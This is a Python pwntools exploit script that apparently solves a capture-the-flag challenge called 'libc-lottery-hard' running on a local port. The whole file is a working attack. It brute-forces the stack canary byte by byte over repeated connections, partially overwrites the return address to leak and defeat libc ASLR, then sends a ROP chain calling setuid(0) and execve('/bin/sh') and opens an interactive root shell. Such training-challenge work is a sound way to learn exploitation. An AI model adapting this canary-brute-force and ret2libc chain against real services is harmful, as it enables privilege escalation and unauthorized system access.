#!/usr/bin/python3

from pwn import *
import re
import time

context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF("/challenge/libc-lottery-hard")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rbp = 0x7ff12345678
ret = rbp + 8
canary_add = rbp - 8
input_start = rbp - 0x20 
offset = canary_add - input_start


def get_canary():
    payload = b"a" * offset + b"\x00"
    for i in range(7):
        for j in range(256):
            try:
                io = remote("127.0.0.1",1337)
                payload += j.to_bytes(1,"little")
                io.send(payload)
                data = io.recvall().decode()
            except:
                data = io.clean(timeout = 0.05).decode()
            finally:
                io.close()
            if "*** stack smashing detected ***" not in  data:
                break
            payload = payload[:-1]
    return int.from_bytes(payload[offset:],"little")

def get_3bytes(canary,pid):
    check = []
    only_one = False
    payload =  b"a" * offset + p64(canary) + b"a" * 8 +b"\x20"
    for i in range(256):
        for j in range(0x4,0xff,0x10):
            if i in check:
                continue
            payload += bytes([j])+bytes([i])
            io = remote("127.0.0.1",1337)
            io.send(payload)
            try:
                print(payload[-3:])
                data = io.recvall(timeout=0.05)
                print(data.decode())
                '''if b"stack smashing" in  data and not only_one:
                    c = int.from_bytes(payload[-1:],"little")
                    check = [i for i in range(c,c+12)]
                    only_one = True
                    print(check)'''
#                io.interactive()
            except:
                print('err')
                data = io.clean(timeout=0.05).decode()
            finally:
                io.close()
                if b"Leaving!\n### Goodbye!\n\n" == data:
                    print(payload,hex(int.from_bytes(payload[-3:],"little")))
                    return payload[-3:]
                payload =payload[:-2]

def get_remaining(canary,byte,pid):
    payload = b"a" * offset + p64(canary) + b"a"* 8 + byte
    for j in range(3):
        for i in range(256):
            io = remote("127.0.0.1",1337)
            payload += i.to_bytes(1,"little")
            io.send(payload)
            try:
                data = io.recvall(timeout=0.5)
                print(data.decode())
            except:
                data = io.clean(timeout = 0.5)
                print("Expected",data.decode())
            finally:
                io.close()
                if b"Leaving!\n### Goodbye!\n\n" == data:
                    print(payload)
                    break
                payload = payload[:-1]
    l = int.from_bytes(payload[-6:],"little")
    print(hex(l))
    return l - 0x84420 # i subtract the offset of puts address

if __name__ == "__main__":
    canary = get_canary()
    print(hex(canary))
    byte = get_3bytes(canary,279)
    libc_base = get_remaining(canary,byte,279)
    libc.address = libc_base
    rop_elf = ROP(elf)
    rop_libc = ROP(libc)

    pop_rdi = rop_libc.find_gadget(['pop rdi','ret']).address
    pop_rsi = rop_libc.find_gadget(['pop rsi','ret']).address
    pop_rdx = rop_libc.find_gadget(['pop rdx','pop r12','ret']).address
    ret  = rop_libc.find_gadget(['ret']).address

    payload = b"a" * offset + p64(canary) + b"a" * 8
    payload += p64(pop_rdi) + p64(0)
    payload += p64(ret)
    payload += p64(libc.sym.setuid)
    payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rdx) + p64(0) + p64(0)
    payload += p64(ret)
    payload += p64(libc.sym.execve)

    io = remote('127.0.0.1',1337)
    io.send(payload)
    io.interactive()
